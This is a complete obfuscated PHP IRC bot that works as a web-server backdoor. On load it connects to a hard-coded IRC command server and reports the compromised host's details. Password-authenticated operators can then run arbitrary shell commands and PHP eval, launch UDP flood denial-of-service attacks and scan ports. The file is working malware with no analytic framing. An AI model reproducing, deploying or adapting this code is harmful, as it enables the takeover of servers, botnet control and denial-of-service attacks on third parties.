<?php set_time_limit(0); error_reporting(0);  class VvfjnFFrzFRfrFJvF {

 var $nFfBbvnNjBFrrrj = array("nzvbFzVbFjjZnrrV"=>"gangbang.angels-agency.nl",
                     "fZzJ"=>"23232",
                     "zvvjf"=>"scary",
                     "vRZnJf"=>"13",
                     "LpDhX"=>"#wWw#",
                     "Rbz"=>"scan",
                     "RZrRFrjBB"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "RvrNjzVNfZ"=>".",
                     "RVzNJFVJJRz"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $vNfvRNVjJvZnZNJZrr = array(); 
 function MQaayEiAmYQMiQmUeqm() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $HXTPhTtlXxL = "\0034ON\003"; } else { $HXTPhTtlXxL = "\0039OFF\003"; }

	$pdTXtpTL = php_uname();
	if($pdTXtpTL == "") { $RfWwLd = "\00315---\003"; } else { $RfWwLd = "\00315".$pdTXtpTL."\003"; }
		 
	 $fbkk = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $ppgKO =  getcwd()."";
	 
	 $xWCK = "\00315".$ppgKO."\003";

	$SoKWgOWCcK = fileperms("$ppgKO");

	if (($SoKWgOWCcK & 0xC000) == 0xC000) { $GWGocGWKCcS = 's';
	} elseif (($SoKWgOWCcK & 0xA000) == 0xA000) { $GWGocGWKCcS = 'l';
	} elseif (($SoKWgOWCcK & 0x8000) == 0x8000) { $GWGocGWKCcS = '-';
	} elseif (($SoKWgOWCcK & 0x6000) == 0x6000) { $GWGocGWKCcS = 'b';
	} elseif (($SoKWgOWCcK & 0x4000) == 0x4000) { $GWGocGWKCcS = 'd';
	} elseif (($SoKWgOWCcK & 0x2000) == 0x2000) { $GWGocGWKCcS = 'c';
	} elseif (($SoKWgOWCcK & 0x1000) == 0x1000) { $GWGocGWKCcS = 'p';
	} else { $GWGocGWKCcS = 'u'; }

	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0100) ? 'r' : '-');
	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0080) ? 'w' : '-');
	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0040) ?	(($SoKWgOWCcK & 0x0800) ? 's' : 'x' ) :	(($SoKWgOWCcK & 0x0800) ? 'S' : '-'));

	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0020) ? 'r' : '-');
	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0010) ? 'w' : '-');
	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0008) ?	(($SoKWgOWCcK & 0x0400) ? 's' : 'x' ) :	(($SoKWgOWCcK & 0x0400) ? 'S' : '-'));

	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0004) ? 'r' : '-');
	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0002) ? 'w' : '-');
	$GWGocGWKCcS .= (($SoKWgOWCcK & 0x0001) ?	(($SoKWgOWCcK & 0x0200) ? 't' : 'x' ) :	(($SoKWgOWCcK & 0x0200) ? 'T' : '-'));
			
	$VJHl = "\00315".$GWGocGWKCcS."\003";

	$this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"\00314[SAFE:\003\002 $HXTPhTtlXxL\002\00314]\00315 $fbkk \00314[pwd:]\00315 $xWCK \00314(\003$VJHl\00314) [uname:]\00315 $RfWwLd");
 } function YaUMIuqEm($XpDT) 
 { 
    $this->vNfvRNVjJvZnZNJZrr[$XpDT] = true; 
 } function YeYmEAQIiEAyq() 
 { 
    if(!($this->KKkcsCWCC = fsockopen($this->nFfBbvnNjBFrrrj['nzvbFzVbFjjZnrrV'],$this->nFfBbvnNjBFrrrj['fZzJ'],$e,$s,30))) 
    $this->YeYmEAQIiEAyq(); 
    $this->uEUmMUYQiAIaIMmyM();
    if(strlen($this->nFfBbvnNjBFrrrj['zvvjf'])>0) 
    $this->UMeemQa("PASS ".$this->nFfBbvnNjBFrrrj['zvvjf']);
    $this->QAMaYqAiuayamEEM();
    $this->AeqeAiaQEUUIaM();
 } function ueuQeiqQ($XpDT) 
 { 
    unset($this->vNfvRNVjJvZnZNJZrr[$XpDT]); 
 } function uEUmMUYQiAIaIMmyM() {
  $tldpTt = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $TXpdxtt = strlen($tldpTt);
  for($p=0;$p<6;$p++) {
	$iem .= $tldpTt[rand(0,$TXpdxtt-1)];
  }
  if(php_uname() == "") { $pdTXtpTL = "---"; } else { $pdTXtpTL = php_uname(); }
  $this->UMeemQa("USER ".$iem."-go 127.0.0.1 localhost :".$pdTXtpTL."");
 } function aMAAqQ($LpDhX,$Rbz=NULL) 
 { 
    $this->UMeemQa("JOIN $LpDhX $Rbz"); 
 } function iQUmMAIAeUq($pX,$Lxh)
 {
    $this->UMeemQa("PRIVMSG $pX :$Lxh");
 } function QAMaYqAiuayamEEM() {
  $tldpTt = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $TXpdxtt = strlen($tldpTt);
  for($p=0;$p<$this->nFfBbvnNjBFrrrj['vRZnJf'];$p++) {
	$iem .= $tldpTt[rand(0,$TXpdxtt-1)];
  }
  $this->UMeemQa("NICK ".$iem."");
 } function yAiqaUmEUQqyuEUAYe($XpDT,$HXThPLDhhT,$EuqY) {
	$this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"[\002UdpFlood Gestart!\002]"); 
	$TlthlDHdH = "";
	for($p=0;$p<$HXThPLDhhT;$p++) { $TlthlDHdH .= chr(mt_rand(1,256)); }
	$TlPLX = time();
	$p = 0;
	while(time()-$TlPLX < $EuqY) {
		$RL=fsockopen("udp://".$XpDT,mt_rand(0,6000),$e,$s,5);
      	fwrite($RL,$TlthlDHdH);
       	fclose($RL);
		$p++;
	}
	$rWH = $p * $HXThPLDhhT;
	$rWH = $rWH / 1048576;
	$pfg = $rWH / $EuqY;
	$pfg = round($pfg);
	$rWH = round($rWH);
	$this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"[\002UdpFlood Afgerond!\002]: $rWH MB verzonden / gemiddelde: $pfg MB/s ");
 } function uQuQaaiUeYym($XpDT) 
 { 
    if(isset($this->vNfvRNVjJvZnZNJZrr[$XpDT])) 
       return 1; 
    else 
       return 0; 
 } function UMeemQa($Lxh) 
 { 
    fwrite($this->KKkcsCWCC,"$Lxh\r\n"); 
 } function eeyeIqYaaa($pX,$Lxh)
 {
    $this->UMeemQa("NOTICE $pX :$Lxh");
 }function AeqeAiaQEUUIaM() 
 { 
    while(!feof($this->KKkcsCWCC)) 
    { 
       $this->AEYqQ = trim(fgets($this->KKkcsCWCC,512)); 
       $FfZvvbNfbnvzF = explode(" ",$this->AEYqQ); 
       if(substr($this->AEYqQ,0,6)=="PING :") 
       { 
          $this->UMeemQa("PONG :".substr($this->AEYqQ,6)); 
       } 
       if(isset($FfZvvbNfbnvzF[1]) && $FfZvvbNfbnvzF[1] =="004") 
       { 
          $this->UMeemQa("JOIN ".$this->nFfBbvnNjBFrrrj['LpDhX']." ".$this->nFfBbvnNjBFrrrj['Rbz']."");
          $this->aMAAqQ($this->nFfBbvnNjBFrrrj['LpDhX'],$this->nFfBbvnNjBFrrrj['Rbz']);
          $this->MQaayEiAmYQMiQmUeqm();
       } 
       if(isset($FfZvvbNfbnvzF[1]) && $FfZvvbNfbnvzF[1]=="433") 
       { 
          $this->QAMaYqAiuayamEEM(); 
       }
       if($this->AEYqQ != $vnF_pxD) 
       { 
          $JJFbvNzjFZZnbR = array(); 
          $GWs = substr(strstr($this->AEYqQ," :"),2); 
          $CgsK = explode(" ",$GWs); 
          $OSgCW = explode("!",$FfZvvbNfbnvzF[0]); 
          $WWgGSW = explode("@",$OSgCW[1]); 
          $WWgGSW = $WWgGSW[1]; 
          $OSgCW = substr($OSgCW[0],1); 
          $okgwgGk = $FfZvvbNfbnvzF[0]; 
          if($CgsK[0]==$this->OSgCW) 
          { 
           for($p=0;$p<count($CgsK);$p++) 
              $JJFbvNzjFZZnbR[$p] = $CgsK[$p+1]; 
          } 
          else 
          { 
           for($p=0;$p<count($CgsK);$p++) 
              $JJFbvNzjFZZnbR[$p] = $CgsK[$p]; 
          } 
          if(count($FfZvvbNfbnvzF)>2) 
          { 
             switch($FfZvvbNfbnvzF[1]) 
             { 
                case "QUIT": 
                   if($this->uQuQaaiUeYym($okgwgGk)) 
                   { 
                      $this->ueuQeiqQ($okgwgGk); 
                   } 
                break; 
                case "PART": 
                   if($this->uQuQaaiUeYym($okgwgGk)) 
                   { 
                      $this->ueuQeiqQ($okgwgGk); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->uQuQaaiUeYym($okgwgGk) && (md5($WWgGSW) == $this->nFfBbvnNjBFrrrj['RVzNJFVJJRz'] || $this->nFfBbvnNjBFrrrj['RVzNJFVJJRz'] == "*")) 
                   { 
                      if(substr($JJFbvNzjFZZnbR[0],0,1)==$this->nFfBbvnNjBFrrrj['RvrNjzVNfZ']) 
                      { 
                         switch(substr($JJFbvNzjFZZnbR[0],1)) 
                         { 
                            case "user": 
                              if(md5($JJFbvNzjFZZnbR[1])==$this->nFfBbvnNjBFrrrj['RZrRFrjBB']) 
                              { 
                                 $this->YaUMIuqEm($okgwgGk);
                              } 
                              else 
                              { 
                                 $this->eeyeIqYaaa($this->nFfBbvnNjBFrrrj['LpDhX'],"[\002Auth\002]: Fout password $OSgCW idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->uQuQaaiUeYym($okgwgGk)) 
                   { 
                      if(substr($JJFbvNzjFZZnbR[0],0,1)==$this->nFfBbvnNjBFrrrj['RvrNjzVNfZ']) 
                      { 
                         switch(substr($JJFbvNzjFZZnbR[0],1)) 
                         {                            case "system": 
                               $SwwCcSwScgSk = substr(strstr($GWs,$JJFbvNzjFZZnbR[0]),strlen($JJFbvNzjFZZnbR[0])+1); 
                               $OcSGwsOkcSWkG = system($SwwCcSwScgSk); 
                               $wGgWggoGgogwOC = explode("\n",$OcSGwsOkcSWkG); 
                               for($p=0;$p<count($wGgWggoGgogwOC);$p++) 
                                  if($wGgWggoGgogwOC[$p]!=NULL) 
                                     $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"      : ".trim($wGgWggoGgogwOC[$p])); 
                            break;                            case "logout": 
                               $this->ueuQeiqQ($okgwgGk); 
                               $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"[\002Auth\002]\00314 Je bent nu uitgelogt $OSgCW"); 
                            break;                            case "info":
                               $this->MQaayEiAmYQMiQmUeqm();
                            break;                            case "sexec":
                               $SwwCcSwScgSk = substr(strstr($GWs,$JJFbvNzjFZZnbR[0]),strlen($JJFbvNzjFZZnbR[0])+1); 
                               $OcSGwsOkcSWkG = shell_exec($SwwCcSwScgSk); 
                               $wGgWggoGgogwOC = explode("\n",$OcSGwsOkcSWkG); 
                               for($p=0;$p<count($wGgWggoGgogwOC);$p++) 
                                  if($wGgWggoGgogwOC[$p]!=NULL) 
                                     $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"      : ".trim($wGgWggoGgogwOC[$p])); 
                            break;                            case "exec": 
                               $SwwCcSwScgSk = substr(strstr($GWs,$JJFbvNzjFZZnbR[0]),strlen($JJFbvNzjFZZnbR[0])+1); 
                               $OcSGwsOkcSWkG = exec($SwwCcSwScgSk); 
                               $wGgWggoGgogwOC = explode("\n",$OcSGwsOkcSWkG); 
                               for($p=0;$p<count($wGgWggoGgogwOC);$p++) 
                                  if($wGgWggoGgogwOC[$p]!=NULL) 
                                     $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"      : ".trim($wGgWggoGgogwOC[$p])); 
                            break;                            case "dns": 
                               if(isset($JJFbvNzjFZZnbR[1])) 
                               { 
                                  $cW = explode(".",$JJFbvNzjFZZnbR[1]); 
                                  if(count($cW)==4 && is_numeric($cW[0]) && is_numeric($cW[1]) && is_numeric($cW[2]) && is_numeric($cW[3])) 
                                  { 
                                     $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"[\002dns\002]: ".$JJFbvNzjFZZnbR[1]." => ".gethostbyaddr($JJFbvNzjFZZnbR[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"[\002dns\002]: ".$JJFbvNzjFZZnbR[1]." => ".gethostbyname($JJFbvNzjFZZnbR[1])); 
                                  } 
                               } 
                            break;                            case "passthru": 
                               $SwwCcSwScgSk = substr(strstr($GWs,$JJFbvNzjFZZnbR[0]),strlen($JJFbvNzjFZZnbR[0])+1); 

                               $OcSGwsOkcSWkG = passthru($SwwCcSwScgSk); 
                               $wGgWggoGgogwOC = explode("\n",$OcSGwsOkcSWkG); 
                               for($p=0;$p<count($wGgWggoGgogwOC);$p++) 
                                  if($wGgWggoGgogwOC[$p]!=NULL) 
                                     $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"      : ".trim($wGgWggoGgogwOC[$p])); 
                            break;                            case "udpflood": 
                               if(count($JJFbvNzjFZZnbR)>3) 
                               { 
                                  $this->yAiqaUmEUQqyuEUAYe($JJFbvNzjFZZnbR[1],$JJFbvNzjFZZnbR[2],$JJFbvNzjFZZnbR[3]); 
                               } 
                            break;                            case "rndnick": 
                               $this->QAMaYqAiuayamEEM(); 
                            break;                            case "pscan": 
                               if(count($JJFbvNzjFZZnbR) > 2) 
                               { 
                                  if(fsockopen($JJFbvNzjFZZnbR[1],$JJFbvNzjFZZnbR[2],$e,$s,15)) 
                                     $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"[\002pscan\002]: ".$JJFbvNzjFZZnbR[1].":".$JJFbvNzjFZZnbR[2]." is \2open\2"); 
                                  else 
                                     $this->iQUmMAIAeUq($this->nFfBbvnNjBFrrrj['LpDhX'],"[\002pscan\002]: ".$JJFbvNzjFZZnbR[1].":".$JJFbvNzjFZZnbR[2]." is \2closed\2"); 
                               } 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($GWs,$JJFbvNzjFZZnbR[1]),strlen($JJFbvNzjFZZnbR[1])));
                            break;                            case "restart": 
                               $this->UMeemQa("QUIT :gerestart door $OSgCW");
                               fclose($this->KKkcsCWCC); 
                               $this->YeYmEAQIiEAyq(); 
                            break;                            case "raw":
                               $this->UMeemQa(strstr($GWs,$JJFbvNzjFZZnbR[1])); 
                            break;                            case "die": 
                               $this->UMeemQa("QUIT :die command from $OSgCW");
                               fclose($this->KKkcsCWCC); 
                               exit;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $vnF_pxD = $this->AEYqQ; 
    } 
    $this->YeYmEAQIiEAyq(); 
 }}
$GSscKOKG = new VvfjnFFrzFRfrFJvF;
$GSscKOKG->YeYmEAQIiEAyq(); ?>